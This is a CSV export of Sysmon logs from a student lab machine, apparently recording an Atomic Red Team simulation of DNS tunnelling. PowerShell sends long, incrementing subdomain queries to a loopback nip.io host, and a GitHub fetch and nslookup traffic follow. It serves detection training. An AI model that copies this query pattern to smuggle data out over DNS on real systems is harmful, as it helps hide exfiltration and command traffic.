"2025-12-26 11:30:08.749 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175415,"Query: 222.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicred.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.325","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.749 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175416,"Query: 223.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredt.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.357","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.749 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175417,"Query: 224.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredte.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.377","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.749 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175418,"Query: 225.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredtea.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.397","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.749 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175419,"Query: 226.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteam.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.429","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.749 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175420,"Query: 227.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteama.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.460","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.749 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175421,"Query: 228.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamat.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.493","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.026 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175422,"Query: 229.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamato.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.512","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.027 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175423,"Query: 230.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatom.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.545","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.027 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175424,"Query: 231.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomi.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.728","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.759 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175425,"Query: 232.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomic.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.761","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.759 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175426,"Query: 233.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicr.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.793","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175427,"Query: 234.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicre.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.813","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175428,"Query: 235.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicred.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.833","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175429,"Query: 236.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredt.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.853","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175430,"Query: 237.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredte.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.874","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175431,"Query: 238.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredtea.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.906","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175432,"Query: 239.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteam.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.931","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175433,"Query: 240.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteama.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.952","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175434,"Query: 241.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamat.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.971","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175435,"Query: 242.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamato.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:09.004","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175436,"Query: 243.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatom.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:09.025","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175437,"Query: 244.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomi.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:09.045","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175438,"Query: 245.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomic.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:09.065","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175439,"Query: 246.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicr.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:09.086","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175440,"Query: 247.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicre.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:09.118","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175441,"Query: 248.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicred.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:09.138","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175442,"Query: 249.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredt.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:09.170","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175443,"Query: 250.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredte.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:09.190","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175444,"Query: 251.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredtea.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:09.222","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:10.783 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175447,"Query: 252.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteam.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:09.241","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:10.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175448,"Query: 253.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteama.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:09.261","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:14.930 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175450,"Query: raw.githubusercontent.com ¦ Result: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133; ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9956 ¦ PGUID: E9F06A57-63B1-694E-5F02-000000002400","QueryStatus: 0 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:12.966","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:14.616 +01:00","Net Conn","info","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",175449,"Initiated: true ¦ Proto: tcp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 57051 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 185.199.111.133 ¦ TgtPort: 443 ¦ TgtHost: cdn-185-199-111-133.github.com ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9956 ¦ PGUID: E9F06A57-63B1-694E-5F02-000000002400","DestinationIsIpv6: false ¦ DestinationPortName: https ¦ RuleName: - ¦ SourceIsIpv6: false ¦ SourcePortName: - ¦ UtcTime: 2025-12-26 10:30:13.035","Sysmon_3_Info_NetConn.yml","a87defd7-1f87-4a34-8864-415ccb2ef21c","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:18.507 +01:00","Net Conn","info","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",175463,"Initiated: true ¦ Proto: udp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 54357 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 192.168.201.2 ¦ TgtPort: 53 ¦ TgtHost: - ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Windows\System32\nslookup.exe ¦ PID: 6592 ¦ PGUID: E9F06A57-63B9-694E-6602-000000002400","DestinationIsIpv6: false ¦ DestinationPortName: domain ¦ SourceIsIpv6: false ¦ UtcTime: 2025-12-26 10:30:17.501","Sysmon_3_Info_NetConn.yml","a87defd7-1f87-4a34-8864-415ccb2ef21c","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:18.507 +01:00","Net Conn","info","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",175464,"Initiated: true ¦ Proto: udp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 54358 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 192.168.201.2 ¦ TgtPort: 53 ¦ TgtHost: - ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Windows\System32\nslookup.exe ¦ PID: 6592 ¦ PGUID: E9F06A57-63B9-694E-6602-000000002400","DestinationIsIpv6: false ¦ DestinationPortName: domain ¦ SourceIsIpv6: false ¦ UtcTime: 2025-12-26 10:30:17.505","Sysmon_3_Info_NetConn.yml","a87defd7-1f87-4a34-8864-415ccb2ef21c","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:23.826 +01:00","Net Conn (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",175201,"Initiated: true ¦ Proto: udp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 56943 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 192.168.201.2 ¦ TgtPort: 53 ¦ TgtHost: - ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Users\student\AppData\Local\Programs\Microsoft VS Code\Code.exe ¦ PID: 2052 ¦ PGUID: E9F06A57-623C-694E-E601-000000002400","DestinationIsIpv6: false ¦ DestinationPortName: domain ¦ RuleName: Usermode ¦ SourceIsIpv6: false ¦ UtcTime: 2025-12-26 10:29:22.654","Sysmon_3_Med_NetConn_RuleAlert.yml","e13c5fe0-73f1-4c0f-aef5-1bab99b4237b","C:\Tools\Logs\art_1071_004x.evtx"
